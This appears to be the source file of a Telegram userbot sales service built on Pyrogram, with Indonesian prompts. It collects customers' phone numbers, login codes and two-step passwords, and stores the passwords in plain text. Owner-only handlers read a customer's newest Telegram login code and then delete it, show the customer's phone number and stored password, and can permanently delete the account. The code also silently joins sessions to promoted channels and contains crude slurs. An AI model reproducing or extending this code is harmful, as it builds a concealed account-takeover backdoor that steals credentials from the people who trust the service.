import asyncio
import importlib
from datetime import datetime
from time import time

from pyrogram.enums import SentCodeType
from pyrogram.raw import functions
from pyrogram.errors import *
from pyrogram.types import *

from PyroUbot import *


async def deak_account(client, message):
    if len(message.command) < 2:
        return await message.reply(f"{message.text} user_id")
    try:
        user_id = int(message.command[1])
    except Exception as error:
        return await message.reply(error)
    user = [x for x in ubot._ubot if x.me.id == user_id]
    if user:
        ubot._ubot.remove(user[0])
        await user[0].invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
        return await message.reply(f"{user[0].me.mention} berhasil dideak")
    else:
        return await message.reply("user_id tersebut tidak ditemukan")


async def cek_status(client, callback_query):
    user_id = callback_query.from_user.id
    buttons = [[InlineKeyboardButton("Buat Userbot Anda", callback_data="bahan")], [InlineKeyboardButton("Kembali", callback_data=f"home {user_id}")]]
    text = await MSG.STATUS_UB(user_id)
    await callback_query.message.delete()
    return await bot.send_message(
        user_id,
        text,
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(buttons),
    )


async def need_api(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        return await bot.send_message(
            user_id,
            "<blockquote><b>❌ Anda Sudah Membuat Userbot\n\nJika Userbot Anda Tidak Bisa Di Gunakan Silahkan Klik: /restart</b></blockquote>",
        )
    elif user_id not in await get_prem():
        buttons = [
            [InlineKeyboardButton("Lanjutkan", callback_data="bayar_dulu")],
            [InlineKeyboardButton("Batalkan", callback_data=f"home {user_id}")],
        ]
        await callback_query.message.delete()
        return await bot.send_message(
            user_id,
            MSG.POLICY(),
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("Tutup", callback_data="0_cls")],
        ]
        await callback_query.message.delete()
        return await bot.send_message(
            user_id,
            f"""
<b>Tidak Bisa Membuat Userbot</b>

<b>Karna Maximal Userbot Adalah {Fonts.smallcap(str(len(ubot._ubot)))} Telah Tercapai</b>

<b>☎️ Silahkan Hubungi: <a href=t.me/pranwild>Admin</a> Jika Mau Dibuatkan Bot Seperti Saya</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("Lanjutkan", callback_data="add_ubot")]]
        await callback_query.message.delete()
        return await bot.send_message(
            user_id,
            """
<blockquote><b>✅ Untuk Membuat Userbot Siapkan Bahan Berikut

   NOMOR AKUN: Nomer Hp Akun Telegram

☑️ Jika Sudah Tersedia Silahkan Klik Tombol Dibawah</b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


async def payment_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    buttons = Button.plus_minus(1, user_id)
    await callback_query.message.delete()
    return await bot.send_message(
        user_id,
        MSG.TEXT_PAYMENT(30, 30, 1),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(buttons),
    )


async def bikin_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.delete()
    try:
        phone = await bot.ask(
            user_id, 
            ("<blockquote><b>Silahkan Masukan Nomor Akun Telegram Anda Dengan Format Kode Negara.\nContoh: +628xxxxxxx</b>\n" "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b></blockquote>"),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Pembatalan Otomatis")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )
    get_otp = await bot.send_message(user_id, "<blockquote><b>Mengirim Kode Otp...</b></blockquote>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except ApiIdInvalid as AID:
        await get_otp.delete()
        return await bot.send_message(user_id, AID)
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await bot.send_message(user_id, PNI)
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await bot.send_message(user_id, PNF)
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await bot.send_message(user_id, PNB)
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await bot.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    try:
        sent_code = {
            SentCodeType.APP: "<a href=tg://openmessage?user_id=777000>Akun Telegram</a> Resmi",
            SentCodeType.SMS: "Sms Anda",
            SentCodeType.CALL: "Panggilan Telepon",
            SentCodeType.FLASH_CALL: "Panggilan Kilat Telepon",
            SentCodeType.FRAGMENT_SMS: "Fragment Sms",
            SentCodeType.EMAIL_CODE: "Email Anda",
        }
        await get_otp.delete()
        otp = await bot.ask(
            user_id,
            (f"<blockquote><b>Silahkan Periksa Kode Otp Dari {sent_code[code.type]}. Kirim Kode Kesini Setelah Membaca Format Di Bawah Ini.</b>\n" "\nJika Kode Otp Adalah <code>12345</code> Tolong <b>[ Tambahkan Spasi ]</b> Kirimkan Seperti Ini <code>1 2 3 4 5</code>\n" "\n<b>Gunakan /cancel Untuk Membatalkan Proses Membuat Userbot</b></blockquote>"),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Waktu Telah Habis")
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        return await bot.send_message(user_id, PCI)
    except PhoneCodeExpired as PCE:
        return await bot.send_message(user_id, PCE)
    except BadRequest as error:
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "<blockquote><b>Akun Anda Telah Mengaktifkan Verifikasi 2 Langkah. Silahkan Masukkan Passwordanya.\n\nGunakan /cancel Untuk Membatalkan Proses Membuat Userbot</b></blockquote>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(user_id, "Pembatalan Otomatis")
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            await set_two_factor(user_id, new_code)
        except Exception as error:
            return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await bot.send_message(
        user_id,
        "Sedang Memproses....\n\nSilahkan Tunggu Sebentar",
        disable_web_page_preview=True,
    )
    await new_client.start()
    if not user_id == new_client.me.id:
        ubot._ubot.remove(new_client)
        await rem_two_factor(new_client.me.id)
        return await bot_msg.edit("<b>ʜᴀʀᴀᴘ ɢᴜɴᴀᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀɴᴅᴀ ᴅɪ ᴀᴋᴜɴ ᴀɴᴅᴀ sᴀᴀᴛ ɪɴɪ ᴅᴀɴ ʙᴜᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴅᴀʀɪ ᴀᴋᴜɴ ʟᴀɪɴ</>")
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
    await set_uptime(new_client.me.id, time())
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"PyroUbot.modules.{mod}"))
    text_done = f"<blockquote><b>⚡️ {bot.me.mention} Udah Aktif Ya Jing Di Akun: <a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code></b></blockquote> "
    await bot_msg.edit(text_done)
    try:
        await new_client.join_chat("Forsupportxbutterfly")
        await new_client.join_chat("Zpranstore")
        await new_client.join_chat("sellerjancok")
        await new_client.join_chat("Darensupport")
    except:
        pass
    return await bot.send_message(
        LOGS_MAKER_UBOT,
        f"""
<blockquote><b>❏ Notifikasi Userbot Aktif
 ├ Akun: <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
 ╰ Id: <code>{new_client.me.id}</code></b></blockquote>
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "Cek Kadaluarsa",
                        callback_data=f"cek_masa_aktif {new_client.me.id}",
                    )
                ],
            ]
        ),
        disable_web_page_preview=True,
    )


async def cek_ubot(client, callback_query):
    await bot.send_message(
        callback_query.from_user.id,
        await MSG.USERBOT(0),
        reply_markup=InlineKeyboardMarkup(Button.userbot(ubot._ubot[0].me.id, 0)),
    )


async def next_prev_ubot(client, callback_query):
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "next_ub":
        if count == len(ubot._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "prev_ub":
        if count == 0:
            count = len(ubot._ubot) - 1
        else:
            count -= 1
    await callback_query.edit_message_text(
        await MSG.USERBOT(count),
        reply_markup=InlineKeyboardMarkup(Button.userbot(ubot._ubot[count].me.id, count)),
    )


async def get_num_otp(client, callback_query):
    user_id = callback_query.from_user.id
    query = callback_query.data.split()
    if not user_id == OWNER_ID:
        return await callback_query.answer(
            f"❌ Tombol Ini Bukan Untukmu {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    X = ubot._ubot[int(query[2])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ Kode Otp Tidak Di Temukan", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=InlineKeyboardMarkup(Button.userbot(X.me.id, int(query[2]))),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)
    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"<b>📲 ɴᴏᴍᴇʀ ᴛᴇʟᴇᴘᴏɴ ᴅᴇɴɢᴀɴ ᴜsᴇʀ_ɪᴅ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{X.me.phone_number}</code></b>",
                reply_markup=InlineKeyboardMarkup(Button.userbot(X.me.id, int(query[2]))),
            )
        except Exception as error:
            return await callback_query.answer(error, True)
    elif query[0] == "get_faktor":
        code = await get_two_factor(X.me.id)
        if code == None:
            return await callback_query.answer(
                "🔐 ᴋᴏᴅᴇ ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ",
                True,
            )
        else:
            return await callback_query.edit_message_text(
                f"<b>🔐 ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴅᴇɴɢᴀɴ ᴜsᴇʀ_ɪᴅ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{code}</code></b>",
                reply_markup=InlineKeyboardMarkup(Button.userbot(X.me.id, int(query[2]))),
            )


async def cek_userbot_expired(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await get_expired_date(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f"⏳ Tinggal {xxxx} Hari Lagi", True)
    except:
        return await callback_query.answer("✅ Sudah Tidak Aktif", True)


async def hapus_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    if not user_id == OWNER_ID:
        return await callback_query.answer(
            f"❌ Tombol Ini Bukan Untukmu {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"{get_id}"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"{get_id}"
    for X in ubot._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot.me.username)
            for chat in await get_chat(X.me.id):
                await remove_chat(X.me.id, chat)
            await rem_pref(X.me.id)
            await remove_ubot(X.me.id)
            await rem_uptime(X.me.id)
            await rem_expired_date(X.me.id)
            ubot._get_my_id.remove(X.me.id)
            ubot._ubot.remove(X)
            await X.log_out()
            await callback_query.answer(f"✅ {get_mention} Berhasil Di Musnahkan Dari Database", True)
            await callback_query.edit_message_text(
                await MSG.USERBOT(0),
                reply_markup=InlineKeyboardMarkup(Button.userbot(ubot._ubot[0].me.id, 0)),
            )
            await bot.send_message(
                LOGS_MAKER_UBOT,
                MSG.EXPIRED_MSG_BOT(X),
                reply_markup=InlineKeyboardMarkup(Button.expired_button_bot()),
            )
            return await bot.send_message(X.me.id, "<b>💬 Masa Aktif Anda Telah Berakhir")


async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        await bot.send_message(callback_query.from_user.id, "<b>ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs!</b>")
        return True
    return False
